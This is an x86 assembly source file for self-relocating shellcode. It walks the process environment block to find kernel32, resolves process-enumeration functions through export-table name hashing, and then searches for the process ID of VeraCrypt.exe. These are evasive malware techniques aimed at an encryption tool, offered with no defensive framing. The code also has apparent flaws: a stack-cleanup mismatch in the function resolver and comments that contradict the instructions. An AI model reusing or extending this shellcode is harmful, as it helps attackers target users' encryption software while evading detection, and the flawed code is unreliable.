[bits 32]
    push esi
    call reloc_base
reloc_base:
    pop esi
    sub esi, 6

jmp main

; arg0: str                 [ebp + 8]
;
; ret: num chars            eax
utils_strlen:
    push ebp
    mov ebp, esp

    ; ebp - 4 = output strlen
    ; ebp - 8 = rsi
    sub esp, 8                  ; allocate local variable space

    mov dword [ebp - 4], 0      ; output
    mov [ebp - 8], esi          ; save esi

    mov esi, [ebp + 8]          ; str

    jmp .while_condition
    .loop:
        inc dword [ebp - 4]     ; ++strlen

        .while_condition:
            lodsb

            cmp al, 0           ; end of string ?
            jne .loop

.shutdown:
    mov esi, [ebp - 8]          ; restore esi
    mov eax, [ebp - 4]          ; output

    leave
    ret 4

; arg0: wstr        [ebp + 8]
;
; ret: num chars    eax
utils_wstrlen:
    push ebp
    mov ebp, esp

    ; ebp - 4 = output strlen
    ; ebp - 8 = esi
    sub esp, 8                  ; allocate local variable space

    mov dword [ebp - 4], 0      ; output strlen
    mov [ebp - 8], esi          ; save esi

    mov esi, [ebp + 8]          ; wstr

    jmp .while_condition
    .loop:
        inc dword [ebp - 4]     ; ++strlen

        .while_condition:
            lodsw

            cmp ax, 0           ; end of string ?
            jne .loop       

.shutdown:
    mov esi, [ebp - 8]          ; save esi
    mov eax, [ebp - 4]          ; strlen

    leave
    ret 4

; arg0: &str        [ebp + 8]
;
; ret: folded hash  eax
utils_str_hash:
        push ebp
        mov ebp, esp

        ; ebp - 4 = return value (hash)
        ; ebp - 8 = ebx
        ; ebp - 12 = esi
        ; ebp - 16 = edi

        ; esi = i
        ; edi = strlen
        ; edx = tmp word value from str
        ; ebx = &str
        ; ecx = offset from ebx
        ; eax = currentFold
        sub esp, 16                 ; local variable space

        mov [ebp - 8], ebx          ; store ebx
        mov [ebp - 12], esi         ; store esi
        mov [ebp - 16], edi         ; store edi

        mov dword [ebp - 4], 0      ; hash
        mov ebx, [ebp + 8]          ; &str

        xor esi, esi                ; i = 0

        push dword [ebp + 8]        ; &str
        call utils_strlen

        mov edi, eax                ; strlen

    .loop:
        xor eax, eax                ; currentFold
        mov al, [ebx + esi]         ; str[i] in ax, currentFold
        shl eax, 8                  ; <<= 8

    .i_plus_1:
        mov ecx, esi                ; i
        inc ecx
        
        cmp ecx, edi                ; i + 1 < strlen
        jge .cmp_end

        movzx edx, byte [ebx + ecx]
        xor eax, edx                ; currentFold |= str[i + 1]

    .cmp_end:
        add [ebp - 4], eax          ; hash += currentFold
        add esi, 2                  ; i += 4

        cmp esi, edi                ; i < strlen
        jl .loop

    .shutdown:
        mov eax, [ebp - 4]          ; return value

        mov edi, [ebp - 16]         ; restore edi
        mov esi, [ebp - 12]         ; restore esi
        mov ebx, [ebp - 8]          ; restore ebx

        leave
        ret 4

; arg0: &wstr        [ebp + 8]
;
; ret: folded hash  eax
utils_wstr_hash:
        push ebp
        mov ebp, esp

        ; ebp - 4 = return value (hash)
        ; ebp - 8 = ebx
        ; ebp - 12 = esi
        ; ebp - 16 = edi

        ; esi = i
        ; edi = wstrlen
        ; edx = tmp word value from wstr
        ; ebx = &wstr
        ; ecx = offset from ebx
        ; eax = currentFold
        sub esp, 16                 ; local variable space

        mov [ebp - 8], ebx          ; store ebx
        mov [ebp - 12], esi         ; store esi
        mov [ebp - 16], edi         ; store edi

        mov dword [ebp - 4], 0      ; hash
        mov ebx, [ebp + 8]          ; &wstr

        xor esi, esi                ; i = 0

        push dword [ebp + 8]        ; &wstr
        call utils_wstrlen

        mov edx, 2
        mul edx                     ; double the bytes for wstr

        mov edi, eax                ; wstrlen

    .loop:
        xor eax, eax                ; currentFold
        mov al, [ebx + esi]         ; wstr[i] in ax, currentFold
        shl eax, 8                  ; <<= 8

    .i_plus_1:
        mov ecx, esi                ; i
        add ecx, 2                  ; i + 1 (2 bytes)
        
        cmp ecx, edi                ; i + 1 < wstrlen
        jge .cmp_end

        movzx edx, byte [ebx + ecx]
        xor eax, edx                ; currentFold |= wstr[i + 1]

    .cmp_end:
        add [ebp - 4], eax          ; hash += currentFold
        add esi, 4                  ; i += 4

        cmp esi, edi                ; i < wstrlen
        jl .loop

    .shutdown:
        mov eax, [ebp - 4]          ; return value

        mov edi, [ebp - 16]         ; restore edi
        mov esi, [ebp - 12]         ; restore esi
        mov ebx, [ebp - 8]          ; restore ebx

        leave
        ret 4

; arg0: target hash     ebp + 8
; 
; ret: proc id          eax
utils_find_target_pid_by_hash:
        push ebp
        mov ebp, esp

        ; ebp - 4 = return value
        ; ebp - 8 = snapshot handle
        ; ebp - 304 = process entry struct
        sub esp, 304                ; local variable space

        mov dword [ebp - 4], -1     ; return value

        push 0
        push 0x2                    ; TH32CS_SNAPPROCESS
        call [esi + data + 4]       ; createToolhelp32Snapshot

        cmp eax, -1
        je .shutdown

        mov [ebp - 8], eax          ; snapshot handle
        mov dword [ebp - 304], 296  ; processentry.dwSize

        mov eax, ebp
        sub eax, 304                ; &processentry
        push eax
        push dword [ebp - 8]        ; snapshot handle
        call [esi + data + 8]       ; process32First

        cmp eax, 0
        je .shutdown

    .loop:
        mov eax, ebp
        sub eax, 304
        push eax
        push dword [ebp - 8]        ; snapshot handle
        call [esi + data + 12]       ; process32Next

        cmp eax, 0
        je .loop_end

        mov eax, ebp
        sub eax, 304
        add eax, 36                 ; processEntry.szExeFile
        push eax
        call utils_str_hash

        cmp eax, [ebp + 8]          ; cur hash == target hash
        je .process_found

        jmp .loop

    .process_found:
        mov eax, ebp
        sub eax, 304
        add eax, 8

        mov eax, [eax]
        mov [ebp - 4], eax

        jmp .shutdown
    .loop_end:

    .shutdown:

        push dword [ebp - 8]        ; snapshot handle
        call [esi + data + 16]      ; CloseHandle
        
        mov eax, [ebp - 4]          ; return value

        leave
        ret 4

; arg0: base addr           [ebp + 8]
; arg1: proc name hash      [ebp + 12]
;
; ret:  proc addr           eax
get_proc_address_by_hash:
        push ebp
        mov ebp, esp

        ; ebp - 4 = return value
        ; ebp - 8 = nt headers
        ; ebp - 12 = export data directory
        ; ebp - 16 = export directory
        ; ebp - 20 = address of functions
        ; ebp - 24 = address of names
        ; ebp - 28 = address of name ordinals
        ; ebp - 284 = forwarded dll.function name - 256 bytes
        ; ebp - 288 = function name
        ; ebp - 292 = loaded forwarded library addr
        ; ebp - 296 = function name strlen
        ; ebp - 300 = ebx
        ; ebp - 304 = temp var (r8)
        ; ebp - 308 = temp var (r9)
        ; ebp - 312 = temp var (r10)
        ; ebp - 316 = temp var (r11)
        sub esp, 316                                ; allocate local variable space

        mov dword [ebp - 4], 0                      ; return value
        mov [ebp - 300], ebx                        ; save ebx
   
        mov ebx, [ebp + 8]                          ; base addr
        add ebx, 0x3c                               ; *e_lfa_new

        movzx ecx, word [ebx]                       ; e_lfanew

        mov eax, [ebp + 8]                          ; base addr
        add eax, ecx                                ; nt header

        mov [ebp - 8], eax                          ; nt header

        add eax, 24                                 ; optional header
        add eax, 96                                 ; export data directory

        mov [ebp - 12], eax                         ; export data directory

        mov eax, [ebp + 8]                          ; base addr
        mov ecx, [ebp - 12]                         ; export data directory
        mov ebx, [ecx]
        add eax, ebx                                ; export directory

        mov [ebp - 16], eax                         ; export directory

        add eax, 28                                 ; address of functions rva
        mov eax, [eax]                              ; rva in eax
        add eax, [ebp + 8]                          ; base addr + address of function rva

        mov [ebp - 20], eax                         ; address of functions

        mov eax, [ebp - 16]                         ; export directory
        add eax, 32                                 ; address of names rva
        mov eax, [eax]                              ; rva in eax
        add eax, [ebp + 8]                          ; base addr + address of names rva

        mov [ebp - 24], eax                         ; address of names

        mov eax, [ebp - 16]                         ; export directory
        add eax, 36                                 ; address of name ordinals
        mov eax, [eax]                              ; rva in eax
        add eax, [ebp + 8]                          ; base addr + address of name ordinals

        mov [ebp - 28], eax                         ; address of name ordinals

        mov eax, [ebp - 16]
        mov [ebp - 312], eax                        ; export directory
        add dword [ebp - 312], 12                   ; number of names
        mov eax, ebp
        sub eax, 312
        mov eax, [eax]
        mov [ebp - 312], eax                        ; number of names in [ebp - 312]

        mov dword [ebp - 316], 0                    ; index

    .loop_func_names:
        ; to index into an array, we multiply the size of each element with the 
        ; current index and add it to the base addr of the array
        mov dword eax, 4                            ; size of dword
        mul dword [ebp - 316]                       ; size * index
        mov ebx, [ebp - 24]                         ; address of names
        add ebx, eax                                ; address of names + n
        mov ebx, [ebx]                              ; address of names [n]

        add ebx, [ebp +  8]                         ; base addr + address of names [n]

        push ebx                                    ; base addr + address of names [n]
        call utils_str_hash

        cmp eax, [ebp + 12]                          ; proc name hash
        je .function_found

        inc dword [ebp - 316]
        mov eax, [ebp - 312]
        cmp [ebp - 316], eax
        jne .loop_func_names

        jmp .shutdown

    .function_found:
        mov eax, 2                                  ; size of ordinal value
        mul dword [ebp - 316]                       ; index * size of element of addrees of name ordinals(word)
        add eax, [ebp - 28]                         ; address of name ordinals + n
        movzx eax, word [eax]                       ; address of name ordinals [n]; index into address of functions

        mov ebx, 4                                  ; size of element of address of functions(dword)
        mul ebx                                     ; index * size of element
        add eax, [ebp - 20]                         ; address of functions + index
        mov eax, dword [eax]                        ; address of functions [index]

        add eax, [ebp + 8]                          ; base addr + address of functions [index]

        mov [ebp - 4], eax                          ; return value

    .shutdown:
        mov ebx, [ebp - 300]                        ; restore ebx
        mov eax, [ebp - 4]                          ; return value

        leave
        ret 4

; ret: kernel module hnd       eax
utils_get_kernel_module_handle:
        push ebp
        mov ebp, esp

        ; ebp - 4 = first list entry
        ; ebp - 8 = current list entry
        ; ebp - 12 = table entry
        ; ebp - 16 = kernel mod addr
        sub esp, 16                                 ; allocate local variable space

        mov eax, fs:[0x30]                          ; peb
        add eax, 0xc                                ; *ldr
        mov eax, [eax]                              ; ldr
        add eax, 0x14                               ; InMemoryOrderModuleList

        mov [ebp - 4], eax                          ; *FirstModule
        mov eax, [eax]                              ; FirstModule
        mov [ebp - 8], eax                          ; CurrentModule

    .loop:
        cmp eax, [ebp - 4]                          ; CurrentModule == FirstModule ?
        je .loop_end_equal
            sub eax, 8                              ; *TableEntry
            mov [ebp - 12], eax                     ; *TableEntry

            add eax, 0x2c                           ; *BaseDLLName
            add eax, 0x4                            ; BaseDLLName->Buffer

            push dword [eax]                        ; BaseDLLName.Buffer
            call utils_wstr_hash

            cmp eax, 0x190a1                        ; KERNEL32.DLL hash

            je .module_found

            mov eax, [ebp - 8]                      ; CurrentModule
            mov eax, [eax]                          ; CurrentModule = CurrentMdoule->Flink
            mov [ebp - 8], eax                      ; CurrentModule

            jmp .loop

    .module_found:
        mov eax, [ebp - 12]                         ; *TableEntry
        add eax, 0x18                               ; TableEntry->DllBase
        mov eax, [eax]                              ; DllBase 
        mov [ebp - 16], eax                         ; mod addr

        jmp .shutdown

    .loop_end_equal:

    .shutdown:
        mov eax, [ebp - 16]                         ; mod addr

        leave
        ret

populate_func_addrs:
        push ebp
        mov ebp, esp

        ; CreateToolhelp32Snapshot
        push 0x480d4                            ; hash
        push dword [esi + data]                 ; kernel32
        call get_proc_address_by_hash

        cmp eax, 0
        je .shutdown

        mov [esi + data + 4], eax               ; CreateToolhelp32Snapshot

        ; Process32First
        push 0x2a7a7                            ; hash
        push dword [esi + data]                 ; kernel32
        call get_proc_address_by_hash

        cmp eax, 0
        je .shutdown

        mov [esi + data + 8], eax              ; Process32First addr

        ; Process32Next
        push 0x2a441                            ; hash
        push dword [esi + data]                 ; kernel32
        call get_proc_address_by_hash

        cmp eax, 0
        je .shutdown

        mov [esi + data + 12], eax              ; Process32Next addr

        ; CloseHandle
        push 0x24301                            ; hash
        push dword [esi + data]                 ; kernel32
        call get_proc_address_by_hash

        cmp eax, 0
        je .shutdown

        mov [esi + data + 16], eax              ; CloseHandle addr

    .shutdown:
        leave
        ret

main:
        push ebp
        mov ebp, esp

        call utils_get_kernel_module_handle

        cmp eax, 0
        je .shutdown

        mov [esi + data], eax               ; kernel32 hnd

        call populate_func_addrs
        
        int3
        mov ecx, 0x2c44e                    ; VeraCrypt.exe hash
        push ecx
        call utils_find_target_pid_by_hash

    .shutdown:
        leave
        pop esi
        ret

align 16
data:
; kernel32                  0
; createToolhelp32Snapshot  4
; process32First            8
; process32Next             12
; closeHandle               16
